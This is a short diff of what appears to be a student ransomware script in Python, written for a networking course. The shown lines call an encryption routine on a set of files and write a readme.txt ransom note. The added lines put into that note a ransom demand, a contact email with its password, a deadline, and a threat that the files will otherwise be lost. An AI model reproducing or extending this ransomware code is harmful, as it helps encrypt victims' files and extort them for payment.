@@ -50,3 +50,6 @@ encrypt(archivos_2, key)
 
 with open(archivos + "\\" + "readme.txt", "w") as file:
     file.write("Archivos encriptados por practica de Fundamentos de Redes \nSe solicita un rescate")
+    file.write("ingrese al correo:victima@yopmail.com contraseña:mehackearon")
+    file.write("El dia 22/08/2022 a las 10:45")
+    file.write("De otro modo sus archivos se perderan")
